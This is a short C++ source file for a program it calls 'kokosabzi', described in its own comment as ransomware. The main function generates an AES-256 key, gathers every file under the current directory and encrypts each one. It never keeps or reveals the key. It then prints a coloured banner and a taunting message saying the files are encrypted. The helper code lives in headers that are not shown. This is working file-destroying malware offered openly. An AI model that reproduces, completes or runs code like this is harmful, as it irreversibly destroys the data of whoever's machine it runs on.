// kokosabzi is a ransomware that encrypts and removes files.

#include <iostream>
#include <vector>
#include "utils/KeyUtil.hpp"
#include "utils/IO.hpp"
#include "utils/Crypto.hpp"

using namespace std;
using namespace KokoSabzi;

int main() {
    string key = generate_aes_256_key();
    vector<string> files_to_encrypt = getAllFiles(".");
    for (const auto & file : files_to_encrypt) {
        AES256CBCEncrypt(key, file);
    }

    clearScreen();
    cout << "\x1B[32m" << "██████████████████████\n██████████████████████" << "\x1B[0m" << endl;
    cout << "\x1B[37m" << "██████████████████████\n██████████████████████" << "\x1B[0m" << "    // By Iranian hackers" << endl;
    cout << "\x1B[31m" << "██████████████████████\n██████████████████████" << "\x1B[0m" << endl << endl;
    cout << "Hey. I'm a ransomware. Your files are encrypted. bye;" << endl;
    return 0;
}